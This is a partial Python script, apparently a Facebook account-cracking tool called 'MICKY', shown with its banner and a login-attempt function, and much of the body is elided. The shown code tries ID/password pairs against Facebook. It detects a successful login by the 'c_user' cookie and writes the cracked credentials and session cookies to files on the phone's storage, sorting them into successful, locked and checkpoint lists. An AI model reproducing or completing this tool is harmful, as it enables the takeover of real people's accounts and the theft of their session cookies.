...
def logo():
	os.system("clear")
	print(f"""{W}
.88b  d88. d888888b  .o88b. db   dD db    db 
88'YbdP`88   `88'   d8P  Y8 88 ,8P' `8b  d8' 
88  88  88    88    8P      88,8P    `8bd8'  
88  88  88    88    8b      88`8b      88    
88  88  88   .88.   Y8b  d8 88 `88.    88    
YP  YP  YP Y888888P  `Y88P' YP   YD    YP                                                                                            
{40*'-'}
{P}Facebook : MICKY
{P}Github   : PRIVATE 
{P}Version  : {G}2.36{W}
...
def nrmlrm(id,psd,tid,xrl):
    ...
    'viewport-width': '980',}
			...
			if 'c_user' in lcki:
				...
				if 'Locked' in check:
					print(f"\r\r\x1b[38;5;28m[MICKY] {iid} | {psw}\x1b[1;97m")
					lk.append(id)
					open('/sdcard/TKM/TKM-R-H-LOCK.txt', 'a').write(iid+'|'+psw+'|'+coki+"\n")
					break
				else:
					print(f"\r\r\x1b[1;92m[SUCCESSFUL] {iid} | {psw}\x1b[0m")
					print(f"\r\r\x1b[1;92m[COOKIE] "+coki+"\n")
					ok.append(id)
					open('/sdcard/MICKY-OK.txt', 'a').write(iid+'|'+psw+'|'+coki+"\n")
					break
				break
				...
				try:
					...
					iid=id
				cp.append(id)
				open('/sdcard/MICKY-CP.txt', 'a').write(iid+'|'+psw+"\n")
				break
			else:
				continue
		lop+=1
